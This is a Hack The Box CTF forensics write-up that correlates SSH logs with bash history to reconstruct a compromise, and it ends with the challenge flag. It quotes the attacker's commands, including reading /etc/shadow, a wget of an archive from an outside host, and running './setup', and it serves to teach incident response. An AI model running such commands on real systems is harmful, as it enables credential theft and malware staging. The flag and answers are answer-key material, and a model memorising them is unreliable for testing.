# Hack The Box CTF Write-Up: An Unusual Sighting

**Platform:** Hack The Box  
**Category:** Forensics / Log Analysis  
**Challenge:** An Unusual Sighting  
**Analyst:** BettyCoder

## Challenge Summary

The development team noticed that work on a CMS application was mysteriously disappearing. Two artifacts were recovered from the affected development server:

- `sshd.log`
- `bash_history.txt`

The goal was to correlate SSH authentication activity with shell history to identify the suspicious login and reconstruct what the attacker did.

The challenge also provided one useful environmental detail: normal Korp operating hours were **09:00–19:00**.

---

## 1. Connect to the Challenge

The interactive challenge service was reached with Netcat:

```bash
nc 154.57.164.82 31444
```

The service then asked a sequence of incident-analysis questions based on the recovered logs.

---

## 2. Identify the SSH Server

The SSH log showed connections terminating on:

```text
100.107.36.130 port 2221
```

Therefore, the SSH server was:

```text
100.107.36.130:2221
```

### Why this matters

When reviewing SSH logs, the source address identifies the connecting client, while the destination address and port identify the SSH server that received the connection.

---

## 3. Find the First Successful Login

Searching the SSH log for successful authentication events revealed the first successful login at:

```text
2024-02-13 11:29:50
```

A useful command when reviewing a real SSH log would be:

```bash
grep "Accepted" sshd.log
```

This filters for successful SSH authentication events.

---

## 4. Identify the Unusual Login

The challenge stated that normal operating hours were:

```text
09:00 - 19:00
```

One successful login occurred at:

```text
2024-02-19 04:00:14
```

Because **04:00** is well outside normal operating hours, this was the suspicious login.

The attacker connected from:

```text
2.67.182.119
```

This is a good example of why timestamps are important during incident response. A login can be technically valid while still being suspicious because of **when**, **where**, or **how** it occurred.

---

## 5. Identify the Attacker's Public-Key Fingerprint

The SSH log contained a failed public-key authentication attempt associated with the suspicious activity.

The attacker's public-key fingerprint was:

```text
OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```

The log displayed the value with the `SHA256:` algorithm prefix, but the challenge expected only the fingerprint value itself.

A useful log-analysis command would be:

```bash
grep -i "publickey" sshd.log
```

---

## 6. Correlate the SSH Login With Bash History

After identifying the suspicious login time, the next step was to correlate it with the recovered Bash history.

The first command executed by the attacker was:

```bash
whoami
```

This is common post-compromise behavior because an attacker wants to immediately determine the identity and privileges of the account they obtained.

The following commands showed additional host reconnaissance:

```bash
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
ps faux
```

These commands attempt to answer several questions:

- What user am I?
- What operating system and kernel am I running on?
- What users exist on the host?
- Can password hashes be accessed?
- What processes and services are currently running?

The history also contained an attempt to retrieve an external archive:

```bash
wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz
```

This is particularly suspicious because an unexpected external download following host reconnaissance can indicate tool staging or malware delivery.

---

## 7. Determine the Attacker's Final Command

The final command associated with the attacker's session was:

```bash
./setup
```

This suggests the attacker attempted to execute a locally staged setup script or binary before ending the session.

---

## Investigation Timeline

| Event | Finding |
|---|---|
| SSH server | `100.107.36.130:2221` |
| First successful login | `2024-02-13 11:29:50` |
| Suspicious login | `2024-02-19 04:00:14` |
| Attacker IP | `2.67.182.119` |
| Public-key fingerprint | `OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4` |
| First attacker command | `whoami` |
| Final attacker command | `./setup` |

---

## Flag

```text
HTB{4n_unusual_s1ght1ng_1n_SSH_l0gs!}
```

---

## Key Takeaways

This challenge demonstrates a basic but important incident-response workflow:

1. Establish the normal operating baseline.
2. Search authentication logs for successful and failed login attempts.
3. Identify anomalies such as logins outside normal business hours.
4. Record the source IP and authentication fingerprint.
5. Correlate the authentication timestamp with shell history.
6. Reconstruct the attacker's actions chronologically.
7. Look for reconnaissance, credential access, staging, and execution behavior.

The biggest lesson is that no single log entry tells the whole story. The suspicious activity became clear only after the **SSH authentication logs** and **Bash command history** were correlated.

---

> **Lab note:** This write-up documents activity performed in an authorized Hack The Box CTF environment for cybersecurity training and education.
